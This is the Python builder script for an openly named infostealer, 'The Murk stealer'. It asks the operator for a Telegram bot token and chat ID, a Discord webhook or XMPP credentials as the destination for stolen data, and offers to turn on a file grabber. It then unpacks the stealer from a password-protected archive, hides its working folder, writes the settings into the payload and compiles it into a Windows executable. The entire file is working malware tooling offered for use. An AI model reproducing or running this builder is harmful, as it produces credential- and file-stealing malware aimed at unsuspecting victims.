#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#




import shutil
import os 
import win32con
import win32api
import pyzipper 
import time




class Builder():
    def __init__(self) -> None:
        self.type = self.Menu()
        if self.type == "Telegram" :
            self.Telegram()
        if self.type == "Discord" :
            self.Discord()
        if self.type == "XMPP" :
            self.XMPP()

    def Menu(self):
        cmd = 'mode 80,30'
        os.system(cmd)
        self.logo = '''#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#'''
        print("\033[34m{}\033[0m".format(self.logo))
        print("\033[33m{}\033[0m".format("(i) Welcome to the Murk builder\n\n"))
        self.type = ""
        while self.type != "Telegram" and self.type != "Discord" and self.type != "XMPP":
            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Telegram/Discord/XMPP)"))
            self.type = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        print("\n\n")
        return self.type

    def Telegram(self):
        print("\033[36m\033[4m{}\033[0m".format("(?) HTTP API"))
        self.HTTP = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        print("\033[36m\033[4m{}\033[0m".format("(?) Telegram ID"))
        self.ID = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        self.FG = ""
        while self.FG != "Y" and self.FG != "N" and self.FG != "n" and self.FG != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable File Grubber [y/n]"))
            self.FG = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        self.libs = ""
        self.builder = ""
        while self.builder != "Pyinstaller" and self.builder != "Nuitka":
            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller)"))
            self.builder = input("\033[33m\033[1m{}\033[0m".format(">>> "))


        while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Do you have all needed Python libs [y/n]"))
            self.libs = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        print("\n\n")
        

        if self.libs == "N" or self.libs == "n":
            fullPath = os.path.abspath('Modules.zip')
            fullPath = fullPath.replace('\\Modules.zip', '')
            os.chdir(f'{fullPath}/files')
            os.system('start update.bat')
            time.sleep(30)
            self.libs = "y"
            os.chdir(f'{fullPath}')
            
        else:
            self.BuildTelegram(self.HTTP,self.ID,self.FG)
            self.libs = "n"

        if self.libs == "Y" or self.libs == "y":
            input("\033[33m{}\033[0m".format("(i) Press enter if all libraries installed"))
            self.BuildTelegram(self.HTTP,self.ID,self.FG)
            self.libs = "n"



    def Discord(self):
        print("\033[36m\033[4m{}\033[0m".format("(?) WebHook URL"))
        self.urlWebHook = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        print("\033[36m\033[4m{}\033[0m".format("(?) Bot name"))
        self.name = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        self.FG = ""
        while self.FG != "Y" and self.FG != "N" and self.FG != "n" and self.FG != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable File Grubber [y/n]"))
            self.FG = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        self.builder = ""
        while self.builder != "Pyinstaller" and self.builder != "Nuitka":
            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller)"))
            self.builder = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        self.libs = ""
        while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Do you have all needed Python libs [y/n]"))
            self.libs = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        print("\n\n")
        

        if self.libs == "N" or self.libs == "n":
            fullPath = os.path.abspath('Modules.zip')
            fullPath = fullPath.replace('\\Modules.zip', '')
            os.chdir(f'{fullPath}/files')
            os.system('start update.bat')
            time.sleep(30)
            self.libs = "y"
            os.chdir(f'{fullPath}')
            
        else:
            self.BuildDiscord(self.urlWebHook,self.name,self.FG)
            self.libs = "n"

        if self.libs == "Y" or self.libs == "y":
            input("\033[33m{}\033[0m".format("(i) Press enter if all libraries installed"))
            self.BuildDiscord(self.urlWebHook,self.name,self.FG)
            self.libs = "n"

    def XMPP(self):
        print("\033[36m\033[4m{}\033[0m".format("(?) jabberid"))
        self.jabberid = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        print("\033[36m\033[4m{}\033[0m".format("(?) jabberpassword"))
        self.jabberpassword = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        print("\033[36m\033[4m{}\033[0m".format("(?) jabberreceiver"))
        self.jabberreceiver = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        self.FG = ""
        while self.FG != "Y" and self.FG != "N" and self.FG != "n" and self.FG != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Enable File Grubber [y/n]"))
            self.FG = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        self.builder = ""
        while self.builder != "Pyinstaller" and self.builder != "Nuitka":
            print("\033[36m\033[4m{}\033[0m".format("(?) Choose send type(Nuitka/Pyinstaller)"))
            self.builder = input("\033[33m\033[1m{}\033[0m".format(">>> "))
        self.libs = ""
        while self.libs != "Y" and self.libs != "N" and self.libs != "n" and self.libs != "y":
            print("\033[36m\033[4m{}\033[0m".format("(?) Do you have all needed Python libs [y/n]"))
            self.libs = input("\033[33m\033[1m{}\033[0m".format(">>> " ))
        print("\n\n")
        

        if self.libs == "N" or self.libs == "n":
            fullPath = os.path.abspath('Modules.zip')
            fullPath = fullPath.replace('\\Modules.zip', '')
            os.chdir(f'{fullPath}/files')
            os.system('start update.bat')
            time.sleep(30)
            self.libs = "y"
            os.chdir(f'{fullPath}')
            
        else:
            self.BuildXMPP(self.jabberid,self.jabberpassword,self.jabberreceiver,self.FG)
            self.libs = "n"

        if self.libs == "Y" or self.libs == "y":
            input("\033[33m{}\033[0m".format("(i) Press enter if all libraries installed"))
            self.BuildXMPP(self.jabberid,self.jabberpassword,self.jabberreceiver,self.FG)
            self.libs = "n"



    def BuildXMPP(self, jabberid,jabberpassword,jabberreceiver,FG):
        print("\033[33m{}\033[0m".format("\n\n(i) Building started"))
        with pyzipper.AESZipFile('Modules.zip', 'r', compression=pyzipper.ZIP_STORED,
                                 encryption=pyzipper.WZ_AES) as extracted_zip:
            extracted_zip.extractall(pwd=str.encode('pass'))

        win32api.SetFileAttributes('buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)
        
        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'r') as f:
            data = f.read()

        if FG == "Y" or FG == "y":
            data = data.replace('enableFileGrubber = False', 'enableFileGrubber = True')
        
        data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 2")
        data = data.replace('xmppData = ["jabberid","jabberpassword","jabberreceiver"]',f'xmppData = ["{jabberid}","{jabberpassword}","{jabberreceiver}"]')

        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'w') as file:
            file.write(data)

        fullPath = os.path.abspath('Modules.zip')
        fullPath = fullPath.replace('\\Modules.zip', '')
        os.chdir(f'{fullPath}/buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/')
        if self.builder == "Nuitka":
            os.system('start CompileNuitka.bat')
            while os.path.exists("TheMurk.exe") == 0:
                pass
            if os.path.exists("TheMurk.exe") == 1:
                        time.sleep(180)
                        os.chdir(f'{fullPath}')
                        shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)
        elif self.builder == "Pyinstaller":
            os.system('start CompilePyinstaller.bat')
            while os.path.exists("dist/TheMurk.exe") == 0:
                pass
            if os.path.exists("dist/TheMurk.exe") == 1:
                        time.sleep(5)
                        os.chdir(f'{fullPath}')
                        shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/dist/TheMurk.exe", fullPath)
        shutil.rmtree(r'buildingCache', ignore_errors=True)
        print("\033[33m{}\033[0m".format("(i) done"))
        input("\033[33m{}\033[0m".format("(i) exit on enter..."))


    def BuildDiscord(self,urlWebHook,name,FG):
        print("\033[33m{}\033[0m".format("\n\n(i) Building started"))
        with pyzipper.AESZipFile('Modules.zip', 'r', compression=pyzipper.ZIP_STORED,
                                 encryption=pyzipper.WZ_AES) as extracted_zip:
            extracted_zip.extractall(pwd=str.encode('pass'))

        win32api.SetFileAttributes('buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)

        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'r') as f:
            data = f.read()

        if FG == "Y" or FG == "y":
            data = data.replace('enableFileGrubber = False', 'enableFileGrubber = True')
        
        data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 0")
        data = data.replace('discordData = ["url of your WebHook","name of that WebHook"]',f'discordData = ["{urlWebHook}","{name}"]')

        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'w') as file:
            file.write(data)

        fullPath = os.path.abspath('Modules.zip')
        fullPath = fullPath.replace('\\Modules.zip', '')
        os.chdir(f'{fullPath}/buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/')
        if self.builder == "Nuitka":
            os.system('start CompileNuitka.bat')
            while os.path.exists("TheMurk.exe") == 0:
                pass
            if os.path.exists("TheMurk.exe") == 1:
                        time.sleep(180)
                        os.chdir(f'{fullPath}')
                        shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)
        elif self.builder == "Pyinstaller":
            os.system('start CompilePyinstaller.bat')
            while os.path.exists("dist/TheMurk.exe") == 0:
                pass
            if os.path.exists("dist/TheMurk.exe") == 1:
                        time.sleep(5)
                        os.chdir(f'{fullPath}')
                        shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/dist/TheMurk.exe", fullPath)
        shutil.rmtree(r'buildingCache', ignore_errors=True)
        print("\033[33m{}\033[0m".format("(i) done"))
        input("\033[33m{}\033[0m".format("(i) exit on enter..."))


    def BuildTelegram(self,token,id,FG):
        print("\033[33m{}\033[0m".format("\n\n(i) Building started"))
        with pyzipper.AESZipFile('Modules.zip', 'r', compression=pyzipper.ZIP_STORED,
                                 encryption=pyzipper.WZ_AES) as extracted_zip:
            extracted_zip.extractall(pwd=str.encode('pass'))

        win32api.SetFileAttributes('buildingCache/', win32con.FILE_ATTRIBUTE_HIDDEN)

        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'r') as f:
            data = f.read()

        if FG == "Y" or FG == "y":
            data = data.replace('enableFileGrubber = False', 'enableFileGrubber = True')
        
        data = data.replace("sendType = 0 # 0 via Discord; 1 via Telegram; 2 via XMPP","sendType = 1")
        data = data.replace('TelegramData = ["HTTPAPI that you got from botFather","your chat ID"]',f'TelegramData = ["{token}","{id}"]')

        with open('buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.py', 'w') as file:
            file.write(data)


        fullPath = os.path.abspath('Modules.zip')
        fullPath = fullPath.replace('\\Modules.zip', '')
        os.chdir(f'{fullPath}/buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/')
        if self.builder == "Nuitka":
            os.system('start CompileNuitka.bat')
            while os.path.exists("TheMurk.exe") == 0:
                pass
            if os.path.exists("TheMurk.exe") == 1:
                        time.sleep(180)
                        os.chdir(f'{fullPath}')
                        shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/TheMurk.exe", fullPath)
        elif self.builder == "Pyinstaller":
            os.system('start CompilePyinstaller.bat')
            while os.path.exists("dist/TheMurk.exe") == 0:
                pass
            if os.path.exists("dist/TheMurk.exe") == 1:
                        time.sleep(5)
                        os.chdir(f'{fullPath}')
                        shutil.move("buildingCache/cacheFiles/cache/caching/files/need/forBuild/this/dist/TheMurk.exe", fullPath)

        shutil.rmtree(r'buildingCache', ignore_errors=True)
        print("\033[33m{}\033[0m".format("(i) done"))
        input("\033[33m{}\033[0m".format("(i) exit on enter..."))


Builder()
